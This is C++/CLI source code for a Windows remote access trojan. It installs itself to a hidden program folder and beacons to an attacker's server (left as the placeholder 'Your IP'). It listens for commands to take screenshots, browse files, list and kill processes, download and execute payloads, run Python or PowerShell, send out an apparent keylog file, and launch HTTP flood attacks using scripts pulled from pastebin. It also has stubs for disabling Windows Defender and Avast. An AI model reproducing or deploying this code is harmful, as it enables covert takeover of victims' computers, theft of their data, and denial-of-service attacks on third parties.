#include "pch.h"
#include <windows.h> 
#include "ks.h"
#include <string>
#include <iostream>
#include <thread>
#include "asv.h"
#include "Install.h"
#undef GetTempPath

using namespace System;
using namespace System::Net;
using namespace System::Net::Sockets;
using namespace System::Text;
using namespace System::Windows::Forms;
using namespace System::Threading;
using namespace System::IO;
using namespace System::Drawing;
using namespace System::Diagnostics;
using namespace System::Reflection;
bool Live = false;
void SendData(String^ data) {
    try {
        int PORT_NO = 7465;
        String^ SERVER_IP = "Your IP";
        TcpClient^ client = gcnew TcpClient(SERVER_IP, PORT_NO);
        client->SendTimeout = 5000;
        client->ReceiveTimeout = 5000;
        NetworkStream^ nwStream = client->GetStream();
        array<System::Byte>^ bytesToSend = ASCIIEncoding::ASCII->GetBytes(data);
        nwStream->Write(bytesToSend, 0, bytesToSend->Length);
        client->Close();
    }
    catch (Exception^ ex) {
        Live = false;
    }

}
void SendStartup() {
    WebClient^ nd = gcnew WebClient();
    SendData("NEW|" + "@" + Environment::UserName + "+" + "64Bit");

}

bool type(String^ k, String^ l)
{
    if (k->Split('|')[0] == l) return true;
    return false;
}

void takeScreenShot()
{
    Bitmap^ bmp = gcnew Bitmap(Screen::PrimaryScreen->Bounds.Width, Screen::PrimaryScreen->Bounds.Height);
    Graphics^ g = Graphics::FromImage(bmp);
    g->CompositingQuality =  Drawing2D::CompositingQuality::HighSpeed;
    g->CopyFromScreen(0, 0, 0, 0, Screen::PrimaryScreen->Bounds.Size);
    bmp->Save("C:\\Program Files\\TEQ\\ss.png");
    
}
String^ runcmd(String^ cmd) {
    Process^ proc = gcnew Process;
    proc->StartInfo->FileName = "cmd.exe";
    proc->StartInfo->RedirectStandardInput = true;
    proc->StartInfo->RedirectStandardOutput = true;
    proc->StartInfo->WindowStyle = ProcessWindowStyle::Hidden;
    proc->StartInfo->CreateNoWindow = true;
    proc->StartInfo->UseShellExecute = false;
    proc->Start();

    proc->StandardInput->WriteLine(cmd);
    proc->WaitForExit();
    return "Done";
}
void installpython() {
    if (Directory::Exists("C:\\Python27")) return;
    try {
        WebClient^ gg = gcnew WebClient();
        gg->DownloadFile("https://www.python.org/ftp/python/2.7/python-2.7.amd64.msi", "C:\\Program Files\\TEQ\\set1p.exe");
        runcmd("msiexec /i \"C:\\Program Files\\TEQ\\set1p.exe\" /passive /norestart ADDLOCAL=ALL");
    }
    catch(Exception^ k) {}
}
void setMPos(int x, int y) {
    SetCursorPos(x,y);
}
void DisalWin() {
    //Disable Windows Defender
}
void DisalAvasb() {
    //Disable avast
}
void InstallPip() {
    WebClient^ jh = gcnew WebClient();
    String^ pip = jh->DownloadString("https://bootstrap.pypa.io/get-pip.py");
    File::WriteAllText(Path::GetTempPath() + "ps.py", pip);
    runcmd("python2 \"" + Path::GetTempPath() + "ps.py\"");
}
void Runcommands(String^ data = "") {
    String^ main = "";
    try {
        main = data->Split('|')[1];
    }
    catch (Exception^ j) { return; }
    if (type(data, "MSG"))
    {
        try {
            MessageBox::Show(main->Split('@')[0], main->Split('@')[1]);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "REMOTEC"))
    {
        try {
            takeScreenShot();
            array<System::Byte>^ bytes = File::ReadAllBytes("C:\\Program Files\\TEQ\\ss.png");
            String^ file = Convert::ToBase64String(bytes);
            SendData("REMOTEC|" + file + "@");
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "CLICK"))
    {
        try {
            setMPos(Int32::Parse(main->Split('@')[0]), Int32::Parse(main->Split('@')[1]));
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "VAS"))
    {
        try {
            if (main->Split('@')[0] != "NONE") {
                if (main->Split('@')[0] == "Windows") {
                    DisalWin();
                    return;
                }
                if (main->Split('@')[0] == "Avasb") {
                    DisalWin();
                    return;
                }
            }
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "PING"))
    {
        try {
            SendData("PONG|h@");
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "EXT"))
    {
        try {
            Environment::Exit(0);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "SHOWDIR"))
    {
        try {
            String^ finals = "";
            main = main->Replace("FOLDER","");
            array<String^>^ Files = Directory::GetDirectories(main->Split('@')[0]);
            for each (String ^ ok in Files) {
                finals += ok + "@";
            }
            SendData("RECIVED|" + finals);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "SHOWFILE"))
    {
        try {
            String^ finals = "";
            main = main->Replace("FOLDER", "");
            array<String^>^ Files = Directory::GetFiles(main->Split('@')[0]);
            for each (String ^ ok in Files) {
                finals += ok + "@";
            }
            SendData("RECIVEDF|" + finals);
        }
        catch (Exception^ j) { MessageBox::Show(j->ToString()); }
    }
    else if (type(data, "UPDATE"))
    {
        try {
            String^ thiseone = DateTimeOffset::UtcNow.ToUnixTimeSeconds().ToString();
            array<System::Byte>^ bytes = Convert::FromBase64String(main->Split('@')[0]);
            File::WriteAllBytes("C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1], bytes);
            System::Diagnostics::Process::Start("C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1]);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "GETKEY"))
    {
        try {
            SendData("GETKEY|" + System::IO::File::ReadAllText("C:\\Program Files\\TEQ\\legs.txt") + "@");
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "VISITWEB"))
    {
        try {
            System::Diagnostics::Process::Start(main->Split('@')[0]);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "VISITWEBH"))
    {
        WebClient^ okk = gcnew WebClient();
        try {
            String^ something = okk->DownloadString(main->Split('@')[0]);
        }
        catch(Exception^ j) {}   
    }
    else if (type(data, "RUNFROMWEB"))
    {
        try {
            WebClient^ nd = gcnew WebClient();
            String^ thiseone = DateTimeOffset::UtcNow.ToUnixTimeSeconds().ToString();
            nd->DownloadFile(gcnew Uri(main->Split('@')[0]), "C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1]);
            System::Diagnostics::Process::Start("C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1]);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "RUNFILE"))
    {
        try {
            String^ thiseone = DateTimeOffset::UtcNow.ToUnixTimeSeconds().ToString();
            array<System::Byte>^ bytes = Convert::FromBase64String(main->Split('@')[0]);
            File::WriteAllBytes("C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1], bytes);
            System::Diagnostics::Process::Start("C:\\Program Files\\TEQ\\" + thiseone + main->Split('@')[1]);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "GETPRCC"))
    {
        try {
            String^ okcool = "";
            for each (Process ^ ing in Process::GetProcesses()) {
                okcool += ing->ProcessName + "?" + ing->Id + "?" + ing->MainWindowTitle + "@";
            }
            SendData("GOTDD|" + okcool);
        }
        catch (Exception^ j) {}
    }
    else if (type(data, "KISL"))
    {
        try {
            Process^ okk = Process::GetProcessById(Int32::Parse(main->Split('@')[0]));
            okk->Kill();
        }
        catch (Exception^ j) {}
        
    }
    else if (type(data, "H1T"))
    {
    String^ mayn = main->Split('@')[0];
    for (int i = 0; i < Int32::Parse(main->Split('@')[1]); i++)
        {
        WebClient^ fgfg = gcnew WebClient();
        try
        {
            String^ k = fgfg->DownloadString(mayn);
            String^ c = fgfg->DownloadString(mayn);
            String^ p = fgfg->DownloadString(mayn);
            String^ o = fgfg->DownloadString(mayn);
            k = fgfg->DownloadString(mayn);
            c = fgfg->DownloadString(mayn);
            p = fgfg->DownloadString(mayn);
            o = fgfg->DownloadString(mayn);

        }
        catch (WebException^ exception)
        {
        }

        }
    }
    else if (type(data, "INSTALLPY"))
    {
    installpython();
    runcmd("set PYTHONPATH=%PYTHONPATH%;C:\\Python27");
    File::Move("C:\\Python27\\python.exe","C:\\Python27\\python2.exe");
    InstallPip();
    runcmd("set PYTHONPATH=%PYTHONPATH%;C:\\Python27\\Scripts");
    }
    else if (type(data, "RUN_PY"))
    {
    File::WriteAllText("C:\\Program Files\\TEQ\\scr1pt.py", main->Split('@')[0]);
    SendData("RESPONSE_PY|" + runcmd("python2 C:\\Program Files\\TEQ\\scr1pt.py " + main->Split('@')[1]));
    }
    else if (type(data, "RUNPS"))
    {
    RunPS(main->Split('@')[0]);
    }
    else if (type(data, "H8LKPY"))
    {
    if (!Directory::Exists("C:\\Program Files\\TEQ\\Custom")) Directory::CreateDirectory("C:\\Program Files\\TEQ\\Custom");
    WebClient^ dow = gcnew WebClient();
    File::WriteAllText("C:\\Program Files\\TEQ\\Custom\\Hulk.py",dow->DownloadString("https://pastebin.com/raw/GbbJzPX8"));
    runcmd("python2 \"C:\\Program Files\\TEQ\\Custom\\Hulk.py\" " + main->Split('@')[0] + " " + main->Split('@')[1]);
    }
    else if (type(data, "SUUR"))
    {
    if (!Directory::Exists("C:\\Program Files\\TEQ\\Custom")) Directory::CreateDirectory("C:\\Program Files\\TEQ\\Custom");
    WebClient^ dow = gcnew WebClient();
    File::WriteAllText("C:\\Program Files\\TEQ\\Custom\\Suur.py", dow->DownloadString("https://pastebin.com/raw/K28xkxQB"));
    String^ respond = runcmd("python2 \"C:\\Program Files\\TEQ\\Custom\\Suur.py\" " + main->Split('@')[0] + " " + main->Split('@')[1]);
    }
    else
    {
         
    }
}

void Listen()
{
    Int32 port = 7464;
    IPAddress^ localAddr = IPAddress::Any;
    TcpListener^ server = gcnew TcpListener(localAddr, port);
    server->Start();

    array<System::Byte>^ bytes = gcnew array<System::Byte>(1024);
    String^ data = "";
    while (true)
    {
        TcpClient^ client = server->AcceptTcpClient();
        data = "";
        NetworkStream^ stream = client->GetStream();
        int i;
        while ((i = stream->Read(bytes, 0, bytes->Length)) != 0)
        {
            data = System::Text::Encoding::ASCII->GetString(bytes, 0, i);
        }
        Runcommands(data);
        client->Close();
    }
}

void StayConnected() {
    WebClient^ nd = gcnew WebClient();
    String^ ip = nd->DownloadString("https://wtfismyip.com/text");
    while (true) {      
        SendData("NEW|" + ip + "@" + Environment::UserName + "@" + "64Bit");
        Thread::Sleep(10000);
    }
}
int main(array<System::String ^> ^args)
{
    if (!Directory::Exists("C:\\Program Files\\TEQ\\")) Directory::CreateDirectory("C:\\Program Files\\TEQ\\");
    Install("C:\\Program Files\\TEQ\\");
    if (Process::GetProcessesByName(Path::GetFileNameWithoutExtension(Assembly::GetEntryAssembly()->Location))->Length > 1) Process::GetCurrentProcess()->Kill();
    CheckD3efender();
    runme();
    SendStartup();
    //InstallPip();
    //runcmd("set PYTHONPATH=%PYTHONPATH%;C:\\Python27\\Scripts");
    Thread^ thread = gcnew Thread(gcnew ThreadStart(Listen));
    thread->Start();
    Thread^ thread2 = gcnew Thread(gcnew ThreadStart(run));
    thread2->Start();
    Thread^ ss = gcnew Thread(gcnew ThreadStart(StayConnected));
    ss->Start();
    return 0;
}
